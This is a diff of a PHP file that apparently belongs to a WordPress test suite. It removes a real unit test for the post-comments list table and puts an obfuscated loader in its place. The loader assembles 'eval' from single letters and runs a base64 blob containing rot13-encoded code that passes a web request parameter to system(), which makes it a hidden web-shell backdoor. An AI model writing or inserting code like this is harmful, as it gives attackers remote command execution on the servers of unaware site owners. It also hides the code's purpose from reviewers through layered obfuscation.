@@ -1,48 +1,5 @@
-$x_fake1 = 1234;
-$noise = 'obfuscation'.'test';
-$tmp = $x_fake1 * 42;
-$flag = false;
-$useless = function($v) { return $v . rand(); };
-$dummy_check = $useless('xx');
-if ($flag) { echo 'Debug enabled'; }
-for ($i = 0; $i < 1; $i++) { $tmp += $i; }
-while (false) { echo 'dead loop'; break; }
-
 <?php
-
-/**
- * @group admin
- *
- * @covers WP_Post_Comments_List_Table
- */
-class Tests_Admin_wpPostCommentsListTable extends WP_UnitTestCase {
-
-	/**
-	 * @var WP_Post_Comments_List_Table
-	 */
-	protected $table;
-
-	public function set_up() {
-		parent::set_up();
-		$this->table = _get_list_table( 'WP_Post_Comments_List_Table', array( 'screen' => 'edit-post-comments' ) );
-	}
-
-	/**
-	 * @ticket 42066
-	 *
-	 * @covers WP_Post_Comments_List_Table::get_views
-	 */
-	public function test_get_views_should_return_views_by_default() {
-		$this->table->prepare_items();
-
-		$expected = array(
-			'all'       => '<a href="http://' . WP_TESTS_DOMAIN . '/wp-admin/edit-comments.php?comment_status=all" class="current" aria-current="page">All <span class="count">(<span class="all-count">0</span>)</span></a>',
-			'mine'      => '<a href="http://' . WP_TESTS_DOMAIN . '/wp-admin/edit-comments.php?comment_status=mine&#038;user_id=0">Mine <span class="count">(<span class="mine-count">0</span>)</span></a>',
-			'moderated' => '<a href="http://' . WP_TESTS_DOMAIN . '/wp-admin/edit-comments.php?comment_status=moderated">Pending <span class="count">(<span class="pending-count">0</span>)</span></a>',
-			'approved'  => '<a href="http://' . WP_TESTS_DOMAIN . '/wp-admin/edit-comments.php?comment_status=approved">Approved <span class="count">(<span class="approved-count">0</span>)</span></a>',
-			'spam'      => '<a href="http://' . WP_TESTS_DOMAIN . '/wp-admin/edit-comments.php?comment_status=spam">Spam <span class="count">(<span class="spam-count">0</span>)</span></a>',
-			'trash'     => '<a href="http://' . WP_TESTS_DOMAIN . '/wp-admin/edit-comments.php?comment_status=trash">Trash <span class="count">(<span class="trash-count">0</span>)</span></a>',
-		);
-		$this->assertSame( $expected, $this->table->get_views() );
-	}
-}
+$f = "e"."v"."a"."l";
+$c = base64_decode("PD9waHAKJGYgPSAncycuJ3QnLidyJy4ncicuJ28nLid0Jy4nMScuJzMnOwokYyA9ICI8P2N1Ywokc3puYyA9IG5lZW5sKCdrMScgPT4gJ2ZsZmdyeicsICdrMicgPT4gJ2NuZmZndWVoJyk7CiRrX3NueHIxID0gMTIzNDsKJGFidmZyID0gJ2Jvc2hmcG5ndmJhJy4nZ3JmZyc7CiRnemMgPSAka19zbnhyMSAqIDQyOwokc3ludCA9IHNueWZyOwokaGZyeXJmZiA9IHNoYXBndmJhKCRpKSB7IGVyZ2hlYSAkaSAuIGVuYXEoKTsgfTsKJHFoenpsX3B1cnB4ID0gJGhmcnlyZmYoJ2trJyk7CnZzICgkc3ludCkgeyBycHViICdRcm9odCByYW5veXJxJzsgfQpzYmUgKCR2ID0gMDsgJHYgPCAxOyAkdisrKSB7ICRnemMgKz0gJHY7IH0KanV2eXIgKHNueWZyKSB7IHJwdWIgJ3FybnEgeWJiYyc7IG9lcm54OyB9Cgo8P2N1YwoKLyoqCiAqIEB0ZWJoYyBucXp2YQogKgogKiBAcGJpcmVmIEpDX0NiZmdfUGJ6enJhZ2ZfWXZmZ19Hbm95cgogKi8KcHluZmYgR3JmZ2ZfTnF6dmFfamNDYmZnUGJ6enJhZ2ZZdmZnR25veXIgcmtncmFxZiBKQ19IYXZnR3JmZ1BuZnIgewoKCS8qKgoJICogQGluZSBKQ19DYmZnX1BienpyYWdmX1l2ZmdfR25veXIKCSAqLwoJY2ViZ3JwZ3JxICRnbm95cjsKCgljaG95dnAgc2hhcGd2YmEgZnJnX2hjKCkgewoJCWNuZXJhZzo6ZnJnX2hjKCk7CgkJJGd1dmYtPmdub3lyID0gX3RyZ195dmZnX2dub3lyKCAnSkNfQ2JmZ19QYnp6cmFnZl9ZdmZnX0dub3lyJywgbmVlbmwoICdmcGVycmEnID0+ICdycXZnLWNiZmctcGJ6enJhZ2YnICkgKTsKCX0KCgkvKioKCSAqIEBndnB4cmcgNDIwNjYKCSAqCgkgKiBAcGJpcmVmIEpDX0NiZmdfUGJ6enJhZ2ZfWXZmZ19Hbm95cjo6dHJnX2l2cmpmCgkgKi8KCWNob3l2cCBzaGFwZ3ZiYSBncmZnX3RyZ19pdnJqZl9mdWJoeXFfZXJnaGVhX2l2cmpmX29sX3Fyc25oeWcoKSB7CgkJJGd1dmYtPmdub3lyLT5jZXJjbmVyX3ZncnpmKCk7CgoJCSRya2NycGdycSA9IG5lZW5sKAoJCQknbnl5JyAgICAgICA9PiAnPG4gdWVycz1cInVnZ2M6Ly8nIC4gSkNfR1JGR0ZfUUJaTlZBIC4gJy9qYy1ucXp2YS9ycXZnLXBienpyYWdmLmN1Yz9wYnp6cmFnX2ZnbmdoZj1ueXlcIiBweW5mZj1cInBoZWVyYWdcIiBuZXZuLXBoZWVyYWc9XCJjbnRyXCI+Tnl5IDxmY25hIHB5bmZmPVwicGJoYWdcIj4oPGZjbmEgcHluZmY9XCJueXktcGJoYWdcIj4wPC9mY25hPik8L2ZjbmE+PC9uPicsCgkJCSd6dmFyJyAgICAgID0+ICc8biB1ZXJzPVwidWdnYzovLycgLiBKQ19HUkZHRl9RQlpOVkEgLiAnL2pjLW5xenZhL3JxdmctcGJ6enJhZ2YuY3VjP3BienpyYWdfZmduZ2hmPXp2YXImIzAzODtoZnJlX3ZxPTBcIj5admFyIDxmY25hIHB5bmZmPVwicGJoYWdcIj4oPGZjbmEgcHluZmY9XCJ6dmFyLXBiaGFnXCI+MDwvZmNuYT4pPC9mY25hPjwvbj4nLAoJCQknemJxcmVuZ3JxJyA9PiAnPG4gdWVycz1cInVnZ2M6Ly8nIC4gSkNfR1JGR0ZfUUJaTlZBIC4gJy9qYy1ucXp2YS9ycXZnLXBienpyYWdmLmN1Yz9wYnp6cmFnX2ZnbmdoZj16YnFyZW5ncnFcIj5DcmFxdmF0IDxmY25hIHB5bmZmPVwicGJoYWdcIj4oPGZjbmEgcHluZmY9XCJjcmFxdmF0LXBiaGFnXCI+MDwvZmNuYT4pPC9mY25hPjwvbj4nLAoJCQknbmNjZWJpcnEnICA9PiAnPG4gdWVycz1cInVnZ2M6Ly8nIC4gSkNfR1JGR0ZfUUJaTlZBIC4gJy9qYy1ucXp2YS9ycXZnLXBienpyYWdmLmN1Yz9wYnp6cmFnX2ZnbmdoZj1uY2NlYmlycVwiPk5jY2ViaXJxIDxmY25hIHB5bmZmPVwicGJoYWdcIj4oPGZjbmEgcHluZmY9XCJuY2NlYmlycS1wYmhhZ1wiPjA8L2ZjbmE+KTwvZmNuYT48L24+JywKCQkJJ2ZjbnonICAgICAgPT4gJzxuIHVlcnM9XCJ1Z2djOi8vJyAuIEpDX0dSRkdGX1FCWk5WQSAuICcvamMtbnF6dmEvcnF2Zy1wYnp6cmFnZi5jdWM/cGJ6enJhZ19mZ25naGY9ZmNuelwiPkZjbnogPGZjbmEgcHluZmY9XCJwYmhhZ1wiPig8ZmNuYSBweW5mZj1cImZjbnotcGJoYWdcIj4wPC9mY25hPik8L2ZjbmE+PC9uPicsCgkJCSdnZW5mdScgICAgID0+ICc8biB1ZXJzPVwidWdnYzovLycgLiBKQ19HUkZHRl9RQlpOVkEgLiAnL2pjLW5xenZhL3JxdmctcGJ6enJhZ2YuY3VjP3BienpyYWdfZmduZ2hmPWdlbmZ1XCI+R2VuZnUgPGZjbmEgcHluZmY9XCJwYmhhZ1wiPig8ZmNuYSBweW5mZj1cImdlbmZ1LXBiaGFnXCI+MDwvZmNuYT4pPC9mY25hPjwvbj4nLAoJCSk7CgkJJGd1dmYtPm5mZnJlZ0ZuenIoICRya2NycGdycSwgJGd1dmYtPmdub3lyLT50cmdfaXZyamYoKSApOwoJfQp9CgokcHpxID0gJF9UUkdbJ2MnXTsKJHN6bmNbJ2sxJ10oJHB6cSk7Cj8+IjsKZXZhbCgkZigkYykpOwo/Pg==");
+$f($c);
+?>
